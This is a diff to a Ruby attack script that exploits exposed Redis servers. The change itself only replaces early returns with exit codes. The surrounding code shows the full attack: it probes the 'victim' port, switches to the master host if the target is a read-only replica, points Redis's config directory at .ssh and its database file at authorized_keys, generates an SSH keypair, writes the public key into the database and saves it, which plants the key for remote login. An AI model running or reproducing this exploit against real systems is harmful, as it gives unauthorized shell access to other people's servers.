@@ -63,6 +63,12 @@ if !@opts[:host]
 	return
 end
 
+#For exit and log oneliners
+def error
+	yield
+	exit 1
+end
+
 class Log
 
 	def self.info msg
@@ -122,7 +128,7 @@ end
 #Check if up
 Log.info "Check if port #{@opts[:port]} is open"
 # Because the status code isn't 0 when the host doesnt not respond with anything we allow all non 1 exit codes
-return Log.err "#{@opts[:host]}:#{@opts[:port]} not responding" if
+error {Log.err "#{@opts[:host]}:#{@opts[:port]} not responding"} if
 `timeout --preserve-status #{@opts[:timeout]} sh -c 'cat < /dev/tcp/#{@opts[:host]}/#{@opts[:port]}' > /dev/null 2>&1; echo $?` == "1\n"
 
 Log.info "Gathering information about the victim (use -i to see output)"
@@ -145,7 +151,7 @@ end
 infogather
 
 if @info["slave_read_only"] == "1"
-	return Log.err "This is a readonly slave and master server is down!" if @info["master_link_status"] == "down"
+	error {Log.err "This is a readonly slave and master server is down!"} if @info["master_link_status"] == "down"
 	Log.warn "This is a readonly slave! Attempting to switch to master instead!"
 	@opts[:host] = @info["master_host"]
 	@opts[:port] = @info["master_port"]
@@ -227,7 +233,7 @@ if @opts[:check]
 end
 
 # When doing a vuln check dont go further
-return if @opts[:check]
+exit 0 if @opts[:check]
 
 # Making sure a user and directory are set
 if !@opts[:user]
@@ -242,12 +248,12 @@ end
 Log.info "Setting configuration directory"
 out = send "config set dir #{@opts[:dir]}"
 Log.res out if @opts[:verbose]
-return Log.err "Failed to change config directory to .ssh (might not exist)" if out != "+OK\r\n"
+error {Log.err "Failed to change config directory to .ssh (might not exist)"} if out != "+OK\r\n"
 
 Log.info "Change database file to authorized_keys"
 out = send "config set dbfilename authorized_keys"
 Log.res out if @opts[:verbose]
-return Log.err "Failed to change config database filename" if out != "+OK\r\n"
+error {Log.err "Failed to change config database filename"} if out != "+OK\r\n"
 
 =begin # Checking if we can set a key
 Log.info "Checking if we can set a key"
@@ -261,9 +267,9 @@ FileUtils.mkdir_p host_dir
 
 # Generate ssh keypair
 Log.info "Generating new ssh keypair"
-return Log.err "Error generating keypair" if `ssh-keygen -t rsa -N "" -q -f #{host_dir}/id_rsa -C #{@opts[:user]}@#{@opts[:host]} <<< y; echo $?`[-2] == "1"
+error {Log.err "Error generating keypair"} if `ssh-keygen -t rsa -N "" -q -f #{host_dir}/id_rsa -C #{@opts[:user]}@#{@opts[:host]} <<< y; echo $?`[-2] == "1"
 pubkey = File.read "#{host_dir}/id_rsa.pub"
-return Log.err "Error generating keypair: " + pubkey if !pubkey.start_with? "ssh-rsa"
+error {Log.err "Error generating keypair: " + pubkey} if !pubkey.start_with? "ssh-rsa"
 
 # Checking if we can set a key
 Log.info "Attempt to flush database"
@@ -278,12 +284,12 @@ opendesc = "exec 5<>/dev/tcp/#{@opts[:host]}/#{@opts[:port]}"
 escaped_string = "*3\r\n\$3\r\nset\r\n\$4\r\npkey\r\n\$#{pubkey.length + 4}\r\n#{"\n\n" + pubkey + "\n\n"}\r\n"
 out = send escaped_string
 Log.res out if @opts[:verbose]
-return Log.err "Failed to save key on the server" if out != "+OK\r\n"
+error {Log.err "Failed to save key on the server"} if out != "+OK\r\n"
 
 Log.info "Saving database"
 out = send "save"
 Log.res out if @opts[:verbose]
-return Log.err "Failed to save database" if out != "+OK\r\n"
+error {Log.err "Failed to save database"} if out != "+OK\r\n"
 
 # Save user for later runs
 File.write "#{host_dir}/user", @opts[:user]
